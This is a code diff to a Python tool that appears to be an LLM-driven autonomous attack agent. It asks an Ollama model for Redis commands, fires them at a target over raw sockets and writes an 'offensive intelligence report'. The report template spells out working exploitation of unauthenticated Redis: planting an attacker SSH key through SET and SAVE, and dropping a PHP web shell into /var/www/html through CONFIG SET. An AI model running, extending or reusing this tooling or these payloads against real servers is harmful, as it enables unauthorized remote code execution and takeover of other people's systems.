@@ -27,7 +27,7 @@ def query_ollama(messages, max_tokens=100):
         return ""
 
 def generate_deterministic_report(target, collected_data):
-    """Programmatically parses captured STDOUT to build an offensive intelligence report."""
+    """Programmatically parses decoded STDOUT to build a precise offensive intelligence report."""
     print("\n=================================================================")
     print(" [Autonomous Agent] Generating Offensive Intelligence Report...")
     print("=================================================================")
@@ -38,14 +38,15 @@ def generate_deterministic_report(target, collected_data):
     clients_out = collected_data.get("CLIENT LIST", "N/A")
     ping_out = collected_data.get("PING", "N/A")
 
-    # Extract version safely
+    # Extract version and OS cleanly
     version = "Unknown"
     os_info = "Unknown"
     for line in info_out.splitlines():
-        if line.startswith("redis_version:"):
-            version = line.split(":", 1)[1]
-        elif line.startswith("os:"):
-            os_info = line.split(":", 1)[1]
+        line_clean = line.strip()
+        if line_clean.startswith("redis_version:"):
+            version = line_clean.split(":", 1)[1]
+        elif line_clean.startswith("os:"):
+            os_info = line_clean.split(":", 1)[1]
 
     # Check authentication status
     auth_status = "Unauthenticated / Open Access (Critical Offensive Vector)"
@@ -66,7 +67,7 @@ def generate_deterministic_report(target, collected_data):
 - **Software:** Redis Server v{version}
 - **Operating System:** {os_info}
 - **Service Port:** 6379 (TCP)
-- **Response Check (PING):** Responsive (PONG received)
+- **Response Check (PING):** {'Responsive (PONG received)' if 'PONG' in ping_out else 'No response'}
 
 ### 2. Configuration & Exposure Status
 - **Access Control:** **{auth_status}**
@@ -81,7 +82,7 @@ def generate_deterministic_report(target, collected_data):
      `SET ssh_key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ... attacker@box\n\n"`
      `SAVE`
 2. **Web Shell Deployment (RCE via File Write):**
-   - If a web application shares the environment or target volume, shift the working directory to the web root and drop a script payload:
+   - If a web application shares the environment or target volume, shift working directory to web root and drop a script payload:
      `CONFIG SET dir /var/www/html/`
      `CONFIG SET dbfilename shell.php`
      `SET webshell "<?php system($_GET['cmd']); ?>"`
@@ -142,8 +143,8 @@ Provide ONLY the next database command (INFO, CONFIG GET *, KEYS *, CLIENT LIST,
 
         executed_payloads.add(raw_payload)
 
-        # Execute via Python socket wrapper
-        final_cmd = f"python3 -c \"import socket; s = socket.socket(); s.settimeout(3); s.connect(('{target_host}', int('{target_port}'))); s.send(b'{raw_payload}\\r\\n'); print(s.recv(2048)); s.close()\""
+        # Execute via Python socket wrapper with clean UTF-8 decoding
+        final_cmd = f"python3 -c \"import socket; s = socket.socket(); s.settimeout(3); s.connect(('{target_host}', int('{target_port}'))); s.send(b'{raw_payload}\\r\\n'); print(s.recv(2048).decode('utf-8', errors='ignore')); s.close()\""
 
         print(f"[Action] Executing payload [{raw_payload}] via Python socket wrapper\n")
         
